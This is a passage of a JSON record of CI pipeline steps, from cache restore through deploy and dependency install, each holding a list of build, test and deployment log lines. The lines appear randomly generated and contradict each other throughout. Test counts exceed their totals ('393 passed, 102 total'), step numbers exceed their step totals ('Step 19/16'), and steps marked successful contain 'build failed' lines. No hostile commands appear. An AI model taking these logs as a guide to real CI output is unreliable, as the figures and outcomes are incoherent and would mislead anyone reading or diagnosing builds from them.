          "HEAD is now at dfd3716",
          "[12:17:55] INFO: Processing request",
          "[12:17:55] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "Image pulled successfully",
          "Coverage: 70% statements, 94% branches",
          "npm install: added 199 packages",
          "Cache hit for key-4489",
          "Ready.",
          "Done.",
          "Fetching submodules...",
          "HEAD is now at 730130e",
          "Loading...",
          "Step 6/23: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: e2e/test_db_connect.spec.js",
          "Checking out develop branch",
          "Ready.",
          "Step 6/17: Linting",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Pulling image: node:18",
          "Layer 9/10: COPY command",
          "Pulling image: python:18",
          "Coverage: 71% statements, 92% branches",
          "pip: Collecting prettier",
          "WARNING: react has known vulnerabilities",
          "Ready.",
          "Snapshots: 45 passed, 0 total",
          "Minifying main.js",
          "Compiling utils/app.ts...",
          "[12:17:55] DEBUG: Initializing service",
          "\u2713 build completed",
          "Artifact uploaded: dist.zip (100MB)",
          "Cache miss for key-8491",
          "Cache invalidated: build",
          "Cache restored successfully (350MB)",
          "Cache saved successfully",
          "Fetching submodules...",
          "\u2713 Task completed in 3794ms",
          "[12:17:55] DEBUG: Connection pool: 12 active",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Processing...",
          "Optimizing 46 modules...",
          "Ready.",
          "npm notice: package.json updated",
          "Cache restored successfully (197MB)",
          "Transforming 544 files...",
          "Completed.",
          "Generating source maps...",
          "\u2713 Task completed in 449ms",
          "\u2713 Task completed in 3395ms",
          "[12:17:55] DEBUG: Query executed in 29ms",
          "Time: 38.595s",
          "[12:17:55] INFO: Connecting to database",
          "OK",
          "Already up to date.",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 447 files...",
          "Connection established",
          "Installing eslint@4.16.4",
          "\u2713 package completed",
          "Ready.",
          "[12:17:55] WARN: Deprecated API usage",
          "Compiling utils/main.py...",
          "Installing webpack@3.10.8",
          "Generating source maps...",
          "yarn add: Done in 2.24s",
          "pip: Downloading react-4.17.tar.gz",
          "\u2713 Task completed in 4182ms",
          "[12:17:55] DEBUG: Memory usage: 739MB",
          "OK",
          "npm install: resolved 1748 packages",
          "Transforming 110 files...",
          "npm notice: package.json updated",
          "[12:17:55] WARN: Deprecated API usage",
          "Generating source maps...",
          "Compiling utils/utils.go...",
          "Compiling utils/utils.go...",
          "Using Python 3.12",
          "[12:17:55] INFO: Processing request",
          "[12:17:55] ERROR: Connection failed",
          "Transforming 120 files...",
          "Processing...",
          "Test Suites: 12 passed, 24 total",
          "[12:17:55] WARN: Deprecated API usage",
          "  PASS: test_auth_login (223ms)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Ran 157 tests in 17s",
          "Switched to branch 'hotfix/task-972'",
          "Switched to branch 'bugfix/task-646'",
          "[12:17:55] DEBUG: Query executed in 92ms",
          "Pushing to registry...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/handler.rs...",
          "Minifying vendor.js",
          "Exception: TypeError",
          "Cache restored successfully (150MB)",
          "Compiling components/service.java...",
          "pip: Downloading jest-2.18.tar.gz",
          "[12:17:55] DEBUG: Initializing service",
          "Waiting...",
          "HEAD is now at 24163f7",
          "Checking out develop branch",
          "[12:17:55] WARN: Deprecated API usage",
          "Completed.",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "Compiling utils/index.js...",
          "Layer 8/8: ENV command",
          "Pushing to registry...",
          "Installing eslint@1.3.8",
          "[12:17:55] INFO: Connecting to database",
          "Step 3/22: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 2MB",
          "npm install: resolved 1722 packages",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Uploading artifact 'coverage' (29 files)",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Success!",
          "Cache miss for key-1280",
          "Using Node.js 18.20.2",
          "Done.",
          "Compiling components/index.js...",
          "[12:17:55] INFO: Connecting to database",
          "npm install: added 247 packages",
          "GET /health - 200 (12ms)",
          "Image pulled successfully",
          "Platform: linux-x64",
          "Using Node.js 17.6.4",
          "OK",
          "  PASS: test_user_create (477ms)",
          "Building Docker image...",
          "Completed.",
          "Coverage: 86% statements, 91% branches",
          "Test Suites: 5 passed, 37 total",
          "Uploading artifact 'coverage' (1 files)",
          "Fetching submodules...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:18:13.019371",
        "finished_at": "2025-11-25T12:18:24.295867",
        "log_lines": [
          "=== Step: setup_node ===",
          "Done.",
          "POST /upload - 201 (122ms)",
          "Compiling components/handler.rs...",
          "Test Suites: 20 passed, 47 total",
          "\u2713 All checks passed",
          "Transforming 603 files...",
          "Processing...",
          "Loading...",
          "\u2713 Task completed in 768ms",
          "Using Python 3.10",
          "HEAD is now at 2c104c1",
          "GET /health - 201 (26ms)",
          "[12:17:55] DEBUG: Loading configuration",
          "Ready.",
          "Pushing to registry...",
          "[12:17:55] WARN: Deprecated API usage",
          "pip: Downloading webpack-2.13.tar.gz",
          "Compiling utils/utils.go...",
          "[12:17:55] DEBUG: Connection pool: 4 active",
          "Compiling components/index.js...",
          "Tests: 270 passed, 476 total",
          "FAILED: test_api_health",
          "WARNING: jest has known vulnerabilities",
          "Layer 8/12: COPY command",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 619ms",
          "Artifact uploaded: dist.zip (2MB)",
          "Waiting...",
          "Tests: 393 passed, 102 total",
          "  PASS: test_api_health (341ms)",
          "Cache restored successfully (128MB)",
          "Already up to date.",
          "Image pulled successfully",
          "\u2713 Step 'install' succeeded",
          "Test Suites: 47 passed, 9 total",
          "WARNING: jest has known vulnerabilities",
          "[12:17:55] DEBUG: Loading configuration",
          "GET /health - 201 (24ms)",
          "\u2717 build failed with exit code 15",
          "npm install: added 298 packages",
          "Compiling lib/app.ts...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: unit/test_db_connect.spec.js",
          "npm install: added 250 packages",
          "Coverage: 72% statements, 84% branches",
          "Coverage: 85% statements, 77% branches",
          "Finished.",
          "Using Node.js 14.3.2",
          "Cache hit for key-3984",
          "Cache miss for key-6755",
          "[12:17:55] INFO: Starting build process",
          "Cache miss for key-7407",
          "Compiling lib/app.ts...",
          "[12:17:55] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 3 passed, 32 total",
          "[12:17:55] DEBUG: Memory usage: 884MB",
          "Switched to branch 'bugfix/task-148'",
          "yarn add: Done in 30.7s",
          "Environment: development",
          "Tests: 51 passed, 449 total",
          "WARNING: webpack has known vulnerabilities",
          "Generating source maps...",
          "[12:17:55] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "[12:17:55] INFO: Processing request",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 15/21: Building",
          "Step 3/22: Testing",
          "Connecting to test.io:443...",
          "npm install: resolved 1808 packages",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache restored successfully (386MB)",
          "Bundling runtime.js",
          "Optimizing 90 modules...",
          "Artifact uploaded: dist.zip (8MB)",
          "npm install: resolved 1304 packages",
          "WARNING: express has known vulnerabilities",
          "[12:17:55] INFO: Connecting to database",
          "Artifact downloaded: 12MB",
          "[12:17:55] INFO: Request completed",
          "Using Node.js 18.0.4",
          "[12:17:55] INFO: Cache refreshed",
          "[12:17:55] DEBUG: Connection pool: 12 active",
          "npm notice: package.json updated",
          "Compiling utils/utils.go...",
          "[12:17:55] DEBUG: Memory usage: 1075MB",
          "Optimizing 71 modules...",
          "\u2713 All checks passed",
          "Time: 76.261s",
          "Optimizing 79 modules...",
          "yarn add: Done in 11.13s",
          "Step 7/22: Deploying",
          "Artifact downloaded: 34MB",
          "Finished.",
          "[12:17:55] INFO: Connecting to database",
          "Fetching submodules...",
          "pip: Collecting react",
          "NODE_ENV=production",
          "  PASS: test_auth_login (249ms)",
          "Compiling utils/handler.rs...",
          "Success!",
          "  PASS: test_db_connect (46ms)",
          "TLS handshake completed",
          "Loading...",
          "Test Suites: 49 passed, 21 total",
          "Ran 174 tests in 14s",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at c12057d",
          "Cache hit for key-1535",
          "Installing webpack@1.8.9",
          "pip: Collecting lodash",
          "Verifying...",
          "Checking out develop branch",
          "Fetching submodules...",
          "yarn add: Done in 9.21s",
          "Transforming 658 files...",
          "Success!",
          "Checking out master branch",
          "Generating source maps...",
          "Uploading artifact 'build' (43 files)",
          "[12:17:55] INFO: Processing request",
          "Connection established",
          "Verifying...",
          "Uploading artifact 'build' (12 files)",
          "Transforming 729 files...",
          "\u2713 All checks passed",
          "Tests: 278 passed, 218 total",
          "Compiling src/index.js...",
          "[12:17:55] INFO: Request completed",
          "Done.",
          "WARNING: axios has known vulnerabilities",
          "[12:17:55] INFO: Processing request",
          "npm notice: package.json updated",
          "Step 9/25: Deploying",
          "[12:17:55] INFO: Processing request",
          "Installing jest@2.17.3",
          "Processing...",
          "Step 17/23: Linting",
          "OK",
          "\u2713 Step 'build' succeeded",
          "\u2713 All checks passed",
          "Creating production build...",
          "Artifact uploaded: dist.zip (18MB)",
          "[12:17:55] DEBUG: Loading configuration",
          "Artifact downloaded: 29MB",
          "Compiling utils/index.js...",
          "\u2713 Step 'setup' succeeded",
          "npm install: resolved 937 packages",
          "[12:17:55] INFO: Request completed",
          "Ready.",
          "Installing eslint@1.6.3",
          "NODE_ENV=production",
          "OK",
          "Already up to date.",
          "Image pulled successfully",
          "yarn add: Done in 1.90s",
          "Tests: 110 passed, 121 total",
          "Ready.",
          "Cache invalidated: node_modules",
          "Minifying main.js",
          "Test Suites: 13 passed, 31 total",
          "Connection established",
          "npm notice: package.json updated",
          "[12:17:55] DEBUG: Memory usage: 2000MB",
          "  PASS: test_db_connect (310ms)",
          "Step 9/25: Linting",
          "Using Node.js 19.20.7",
          "[12:17:55] DEBUG: Initializing service",
          "Done.",
          "Waiting...",
          "Using Node.js 14.12.0",
          "Compiling src/app.ts...",
          "Using Node.js 18.20.9",
          "yarn add: Done in 29.84s",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: win32-x64",
          "Step 11/20: Installing dependencies",
          "Step 16/17: Testing",
          "Platform: win32-x64",
          "[12:17:55] WARN: Deprecated API usage",
          "GET /api - 201 (30ms)",
          "Step 1/19: Testing",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "[12:17:55] ERROR: Connection failed",
          "Already up to date.",
          "OK",
          "Cache restored successfully (313MB)",
          "Test Suites: 23 passed, 49 total",
          "Test Suites: 34 passed, 47 total",
          "Step 10/17: Installing dependencies",
          "\u2717 build failed with exit code 17",
          "Compiling src/main.py...",
          "Cache saved successfully",
          "Exception: TypeError",
          "Coverage: 75% statements, 65% branches",
          "Artifact uploaded: dist.zip (30MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:18:24.295867",
        "finished_at": "2025-11-25T12:18:28.806466",
        "log_lines": [
          "=== Step: deploy_production ===",
          "OK",
          "Environment: test",
          "Using Python 3.9",
          "Minifying vendor.js",
          "  PASS: unit/test_user_create.spec.js",
          "[12:17:55] DEBUG: Connection pool: 19 active",
          "Finished.",
          "Layer 7/13: COPY command",
          "[12:17:55] DEBUG: Memory usage: 1815MB",
          "npm install: resolved 1217 packages",
          "Connecting to example.com:443...",
          "Processing...",
          "Step 12/25: Testing",
          "POST /data - 201 (186ms)",
          "FAILED: test_cache_hit",
          "pip: Collecting lodash",
          "[12:17:55] DEBUG: Query executed in 50ms",
          "Compiling src/index.js...",
          "Step 1/16: Running migrations",
          "Ready.",
          "POST /api - 201 (310ms)",
          "  PASS: unit/test_db_connect.spec.js",
          "NODE_ENV=production",
          "Bundling runtime.css",
          "Image pulled successfully",
          "Environment: production",
          "  PASS: unit/test_api_health.spec.js",
          "Image pulled successfully",
          "pip: Downloading express-5.6.tar.gz",
          "Ran 52 tests in 43s",
          "Step 15/19: Testing",
          "HEAD is now at d7a7358",
          "[12:17:55] WARN: Deprecated API usage",
          "npm install: added 329 packages",
          "[12:17:55] INFO: Cache refreshed",
          "Time: 90.452s",
          "Done.",
          "[12:17:55] INFO: Starting build process",
          "OK",
          "[12:17:55] INFO: Processing request",
          "[12:17:55] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (23MB)",
          "TLS handshake completed",
          "Waiting...",
          "npm notice: package.json updated",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u2713 Step 'test' succeeded",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling utils/handler.rs...",
          "Layer 2/10: COPY command",
          "Transforming 341 files...",
          "Cache miss for key-5286",
          "Minifying vendor.js",
          "[12:17:55] DEBUG: Connection pool: 1 active",
          "Compiling lib/index.js...",
          "Cache hit for key-4754",
          "Switched to branch 'feature/task-472'",
          "Completed.",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (17MB)",
          "npm notice: created a lockfile",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "Transforming 362 files...",
          "Cache saved successfully",
          "Completed.",
          "Transforming 954 files...",
          "Installing react@1.10.2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "\u2717 build failed with exit code 23",
          "Step 2/18: Installing dependencies",
          "npm install: resolved 1181 packages",
          "Building Docker image...",
          "GET /api - 204 (67ms)",
          "  PASS: test_user_create (330ms)",
          "Connection established",
          "[12:17:55] DEBUG: Connection pool: 7 active",
          "FAILED: test_user_create",
          "Done.",
          "[12:17:55] INFO: Cache refreshed",
          "Compiling utils/service.java...",
          "Snapshots: 4 passed, 15 total",
          "GET /health - 201 (58ms)",
          "Uploading artifact 'build' (47 files)",
          "[12:17:55] INFO: Connecting to database",
          "Step 1/16: Installing dependencies",
          "Bundling runtime.css",
          "WARNING: eslint has known vulnerabilities",
          "Success!",
          "Pulling image: alpine:latest",
          "WARNING: lodash has known vulnerabilities",
          "Transforming 267 files...",
          "\u2713 Task completed in 3188ms",
          "Cache miss for key-3312",
          "yarn add: Done in 27.84s",
          "Pulling image: node:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 3.10s",
          "Platform: win32-x64",
          "Artifact downloaded: 7MB",
          "[12:17:55] DEBUG: Connection pool: 10 active",
          "Generating source maps...",
          "Compiling lib/service.java...",
          "HEAD is now at 25366fe",
          "Step 6/21: Deploying",
          "\u2713 Step 'setup' succeeded",
          "Uploading artifact 'dist' (26 files)",
          "[12:17:55] INFO: Connecting to database",
          "Step 12/16: Linting",
          "Cache miss for key-9145",
          "Cache invalidated: build",
          "Using Python 3.10",
          "[12:17:55] INFO: Connecting to database",
          "\u2713 package completed",
          "Completed.",
          "[12:17:55] DEBUG: Initializing service",
          "[12:17:55] DEBUG: Connection pool: 3 active",
          "Bundling runtime.css",
          "[12:17:55] DEBUG: Initializing service",
          "Step 8/25: Building",
          "Waiting...",
          "Step 13/23: Installing dependencies",
          "Image pulled successfully",
          "Completed.",
          "Ran 169 tests in 58s",
          "Connecting to test.io:443...",
          "Success!",
          "\u2713 All checks passed",
          "Connection established",
          "Image pulled successfully",
          "NODE_ENV=production",
          "Transforming 438 files...",
          "\u2713 package completed",
          "\u2713 All checks passed",
          "Step 19/22: Deploying",
          "Cache restored successfully (230MB)",
          "  PASS: e2e/test_db_connect.spec.js",
          "Minifying app.js",
          "Exception: ValueError",
          "Checking out main branch",
          "Loading...",
          "[12:17:55] WARN: Deprecated API usage",
          "Uploading artifact 'build' (36 files)",
          "Test Suites: 39 passed, 50 total",
          "Step 19/22: Installing dependencies",
          "WARNING: eslint has known vulnerabilities",
          "FAILED: test_db_connect",
          "Connection established",
          "[12:17:55] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Test Suites: 36 passed, 7 total",
          "Building Docker image...",
          "Time: 7.166s",
          "Cache hit for key-9687",
          "pip install: Successfully installed webpack-2.16",
          "[12:17:55] INFO: Connecting to database",
          "Image pulled successfully",
          "npm install: resolved 313 packages",
          "[12:17:55] INFO: Connecting to database",
          "Connection established",
          "Connecting to test.io:443...",
          "[12:17:55] INFO: Cache refreshed",
          "Creating production build...",
          "Pushing to registry...",
          "Success!",
          "\u2713 Task completed in 4319ms",
          "Platform: darwin-arm64",
          "Compiling lib/handler.rs...",
          "\u2713 Task completed in 4627ms",
          "Generating source maps...",
          "Snapshots: 15 passed, 8 total",
          "Already up to date.",
          "Building Docker image...",
          "[12:17:55] DEBUG: Memory usage: 1555MB",
          "[12:17:55] DEBUG: Connection pool: 12 active",
          "OK",
          "Cache miss for key-2787",
          "Switched to branch 'feature/task-553'",
          "Step 13/18: Running migrations",
          "Environment: staging",
          "OK",
          "[12:17:55] WARN: Deprecated API usage",
          "  PASS: unit/test_api_health.spec.js",
          "Cache invalidated: node_modules",
          "\u2717 build failed with exit code 13",
          "Snapshots: 28 passed, 17 total",
          "Processing...",
          "[12:17:55] DEBUG: Connection pool: 16 active",
          "Step 7/21: Building",
          "Done.",
          "Verifying...",
          "Done.",
          "Pushing to registry...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Processing...",
          "Step 12/20: Building",
          "Verifying...",
          "Ready.",
          "Step 15/25: Testing",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-25T12:18:28.806466",
        "finished_at": "2025-11-25T12:19:02.635955",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Bundling vendor.js",
          "Finished.",
          "Snapshots: 22 passed, 10 total",
          "GET /status - 200 (8ms)",
          "Connecting to example.com:443...",
          "Connection established",
          "FAILED: test_db_connect",
          "Tests: 429 passed, 111 total",
          "Step 10/18: Deploying",
          "Verifying...",
          "Layer 5/14: RUN command",
          "yarn add: Done in 29.77s",
          "npm install: resolved 1515 packages",
          "[12:17:55] DEBUG: Query executed in 1ms",
          "[12:17:55] INFO: Processing request",
          "Transforming 925 files...",
          "Minifying vendor.js",
          "Optimizing 64 modules...",
          "Pulling image: node:latest",
          "Checking out main branch",
          "WARNING: express has known vulnerabilities",
          "Connection established",
          "Optimizing 59 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 18/23: Installing dependencies",
          "Cache miss for key-1731",
          "Artifact downloaded: 29MB",
          "Fetching submodules...",
          "Artifact downloaded: 16MB",
          "Installing eslint@4.13.10",
          "Coverage: 84% statements, 90% branches",
          "\u2713 All checks passed",
          "Cache hit for key-6101",
          "TLS handshake completed",
          "[12:17:55] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Time: 72.36s",
          "Building Docker image...",
          "Bundling runtime.js",
          "Creating production build...",
          "Step 8/21: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "Compiling utils/service.java...",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 19/16: Running migrations",
          "  PASS: test_cache_hit (73ms)",
          "[12:17:55] INFO: Processing request",
          "Pushing to registry...",
          "pip: Downloading prettier-3.11.tar.gz",
          "Compiling src/utils.go...",
          "OK",
          "Cache invalidated: build",
          "Checking out develop branch",
          "Building Docker image...",
          "[12:17:55] DEBUG: Memory usage: 1093MB",
          "[12:17:55] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Time: 40.230s",
          "Coverage: 84% statements, 85% branches",
          "Step 1/24: Running migrations",
          "Success!",
          "WARNING: jest has known vulnerabilities",
          "GET /api - 201 (79ms)",
          "Bundling vendor.js",
          "Coverage: 72% statements, 66% branches",
          "Ready.",
          "Generating source maps...",
          "\u2713 Step 'test' succeeded",
          "Already up to date.",
          "NODE_ENV=development",
          "[12:17:55] INFO: Request completed",
          "[12:17:55] INFO: Request completed",
          "Switched to branch 'feature/task-165'",
          "Platform: linux-x64",
          "Checking out develop branch",
          "[12:17:55] INFO: Request completed",
          "\u2713 Task completed in 416ms",
          "[12:17:55] WARN: Deprecated API usage",
          "Coverage: 77% statements, 99% branches",
          "[12:17:55] DEBUG: Query executed in 69ms",
          "Building Docker image...",
          "[12:17:55] INFO: Starting build process",
          "Time: 33.593s",
          "Cache invalidated: build",
          "Ran 187 tests in 50s",
          "Completed.",
          "[12:17:55] DEBUG: Memory usage: 1248MB",
          "\u2713 build completed",
          "TLS handshake completed",
          "\u2713 Task completed in 3253ms",
          "TLS handshake completed",
          "\u2717 build failed with exit code 112",
          "Waiting...",
          "Ran 93 tests in 39s",
          "Coverage: 71% statements, 71% branches",
          "pip: Installing build dependencies...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Waiting...",
          "Artifact downloaded: 49MB",
          "Done.",
          "Already up to date.",
          "[12:17:55] INFO: Starting build process",
          "Checking out master branch",
          "Step 4/23: Building",
          "Step 4/15: Linting",
          "GET /health - 201 (37ms)",
          "npm install: added 324 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing express@3.11.6",
          "Environment: development",
          "Cache restored successfully (310MB)",
          "Snapshots: 24 passed, 34 total",
          "Success!",
          "Loading...",
          "\u2713 All checks passed",
          "Time: 61.487s",
          "Using Node.js 16.8.5",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Snapshots: 14 passed, 9 total",
          "Uploading artifact 'dist' (30 files)",
          "Cache restored successfully (215MB)",
          "Cache restored successfully (190MB)",
          "Done.",
          "[12:17:55] WARN: Deprecated API usage",
          "Verifying...",
          "Cache hit for key-7864",
          "Switched to branch 'hotfix/task-770'",
          "Creating production build...",
          "OK",
          "FAILED: test_db_connect",
          "Time: 59.513s",
          "Bundling styles.css",
          "Step 7/25: Deploying",
          "Pulling image: alpine:latest",
          "\u2713 All checks passed",
          "Processing...",
          "Layer 9/14: COPY command",
          "Environment: staging",
          "Processing...",
          "Artifact uploaded: dist.zip (51MB)",
          "Pulling image: node:18",
          "Connecting to test.io:443...",
          "[12:17:55] WARN: Deprecated API usage",
          "Waiting...",
          "Generating source maps...",
          "Compiling lib/handler.rs...",
          "Cache saved successfully",
          "Artifact downloaded: 45MB",
          "Cache hit for key-5335",
          "Minifying main.js",
          "[12:17:55] DEBUG: Connection pool: 6 active",
          "Ran 43 tests in 17s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "[12:17:55] DEBUG: Query executed in 69ms",
          "npm notice: package.json updated",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/24: Deploying",
          "[12:17:55] INFO: Connecting to database",
          "TLS handshake completed",
          "POST /api - 202 (80ms)",
          "[12:17:55] DEBUG: Initializing service",
          "Test Suites: 22 passed, 7 total",
          "Compiling utils/service.java...",
          "Completed.",
          "WARNING: webpack has known vulnerabilities",
          "pip: Collecting axios",
          "yarn add: Done in 23.78s",
          "\u2717 build failed with exit code 42",
          "Compiling components/service.java...",
          "\u2713 Task completed in 3022ms",
          "[12:17:55] DEBUG: Initializing service",
          "Uploading artifact 'dist' (31 files)",
          "Completed.",
          "pip: Collecting webpack",
          "Finished.",
          "\u2713 Task completed in 1927ms",
          "npm notice: package.json updated",
          "Layer 5/10: COPY command",
          "[12:17:55] DEBUG: Memory usage: 619MB",
          "npm install: added 475 packages",
          "Test Suites: 41 passed, 30 total",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "Connecting to example.com:443...",
          "Cache restored successfully (412MB)",
          "Artifact uploaded: dist.zip (20MB)",
          "HEAD is now at 3f7fa7f",
          "WARNING: webpack has known vulnerabilities",
          "Step 5/16: Linting",
          "[12:17:55] INFO: Request completed",
          "Platform: linux-x64",
          "Image pulled successfully",
          "Cache hit for key-7106",
          "pip: Installing build dependencies...",
          "yarn add: Done in 24.18s",
          "Pulling image: alpine:18",
          "npm install: resolved 1706 packages",
          "Already up to date.",
          "[12:17:55] DEBUG: Connection pool: 14 active",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:19:02.635955",
        "finished_at": "2025-11-25T12:19:09.401853",
        "log_lines": [
          "=== Step: save_cache ===",
          "Ready.",
          "Step 11/24: Running migrations",
          "Coverage: 95% statements, 89% branches",
          "Completed.",
          "Step 11/25: Deploying",
          "Tests: 223 passed, 190 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:55] WARN: Deprecated API usage",
          "Installing express@1.12.5",
          "Layer 1/8: RUN command",
          "Step 14/16: Linting",
          "Done.",
          "Artifact uploaded: build.tar.gz (16MB)",
          "NODE_ENV=development",
          "[12:17:55] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-496'",
          "Step 17/19: Linting",
          "Platform: darwin-arm64",
          "Switched to branch 'bugfix/task-773'",
          "npm notice: created a lockfile",
          "Cache restored successfully (193MB)",
          "OK",
          "\u2713 Step 'test' succeeded",
          "Installing jest@4.20.2",
          "npm notice: package.json updated",
          "Environment: staging",
          "Success!",
          "[12:17:55] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Image pulled successfully",
          "Connection established",
          "Compiling src/utils.go...",
          "Step 17/25: Linting",
          "  PASS: test_db_connect (5ms)",
          "Tests: 255 passed, 359 total",
          "Tests: 242 passed, 110 total",
          "[12:17:55] WARN: Deprecated API usage",
          "[12:17:55] DEBUG: Loading configuration",
          "[12:17:55] ERROR: Connection failed",
          "Fetching submodules...",
          "Processing...",
          "Already up to date.",
          "Image pulled successfully",
          "\u2717 build failed with exit code 80",
          "Using Python 3.11",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:17:55] INFO: Connecting to database",
          "FAILED: test_cache_hit",
          "[12:17:55] DEBUG: Memory usage: 718MB",
          "Image pulled successfully",
          "Switched to branch 'feature/task-795'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /upload - 202 (410ms)",
          "  PASS: test_user_create (186ms)",
          "HEAD is now at 6bbdfb9",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 Step 'checkout' succeeded",
          "Coverage: 76% statements, 98% branches",
          "TLS handshake completed",
          "Loading...",
          "Platform: win32-x64",
          "HEAD is now at 2d21566",
          "Creating production build...",
          "  PASS: unit/test_api_health.spec.js",
          "Time: 85.458s",
          "pip: Downloading prettier-4.10.tar.gz",
          "Cache invalidated: dependencies",
          "\u2713 Task completed in 1020ms",
          "Cache miss for key-7607",
          "Connecting to test.io:443...",
          "Building Docker image...",
          "Fetching submodules...",
          "Step 12/21: Linting",
          "Verifying...",
          "Finished.",
          "Connecting to example.com:443...",
          "Image pulled successfully",
          "Pushing to registry...",
          "\u2713 Step 'test' succeeded",
          "[12:17:55] DEBUG: Connection pool: 5 active",
          "Compiling src/app.ts...",
          "Connection established",
          "Cache hit for key-3128",
          "Switched to branch 'hotfix/task-112'",
          "Step 1/22: Running migrations",
          "  PASS: test_db_connect (141ms)",
          "Loading...",
          "Environment: test",
          "Installing webpack@5.13.8",
          "\u2713 package completed",
          "FAILED: test_db_connect",
          "[12:17:55] DEBUG: Connection pool: 7 active",
          "Cache hit for key-9716",
          "\u2717 build failed with exit code 9",
          "[12:17:55] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Connection established",
          "HEAD is now at c3b5c4a",
          "[12:17:55] DEBUG: Connection pool: 18 active",
          "npm notice: created a lockfile",
          "Using Node.js 15.3.3",
          "[12:17:55] WARN: Deprecated API usage",
          "POST /api - 201 (176ms)",
          "Transforming 184 files...",
          "Using Python 3.12",
          "Finished.",
          "Processing...",
          "OK",
          "Step 18/25: Installing dependencies",
          "WARNING: eslint has known vulnerabilities",
          "[12:17:55] WARN: Deprecated API usage",
          "Cache restored successfully (329MB)",
          "Finished.",
          "OK",
          "[12:17:55] INFO: Request completed",
          "Step 2/24: Installing dependencies",
          "[12:17:55] INFO: Processing request",
          "  PASS: test_db_connect (85ms)",
          "Finished.",
          "Transforming 639 files...",
          "Time: 96.896s",
          "GET /api - 204 (95ms)",
          "[12:17:55] DEBUG: Query executed in 65ms",
          "GET /health - 201 (81ms)",
          "Exception: NullPointerException",
          "\u2713 Step 'build' succeeded",
          "Layer 6/10: RUN command",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (66MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:17:55] WARN: Deprecated API usage",
          "Ran 195 tests in 51s",
          "HEAD is now at 5d91427",
          "Waiting...",
          "\u2713 Step 'build' succeeded",
          "Platform: linux-x64",
          "Success!",
          "Platform: darwin-arm64",
          "Step 7/18: Installing dependencies",
          "Step 9/17: Running migrations",
          "npm notice: package.json updated",
          "Connection established",
          "Ran 52 tests in 7s",
          "OK",
          "\u2713 All checks passed",
          "Processing...",
          "[12:17:55] DEBUG: Connection pool: 18 active",
          "Step 13/20: Testing",
          "npm install: resolved 797 packages",
          "npm install: added 189 packages",
          "[12:17:55] INFO: Request completed",
          "WARNING: webpack has known vulnerabilities",
          "Layer 4/10: RUN command",
          "Finished.",
          "Processing...",
          "[12:17:55] INFO: Starting build process",
          "[12:17:55] INFO: Cache refreshed",
          "Artifact downloaded: 41MB",
          "pip: Collecting react",
          "  PASS: unit/test_auth_login.spec.js",
          "Compiling src/utils.go...",
          "Time: 24.894s",
          "[12:17:55] DEBUG: Memory usage: 1421MB",
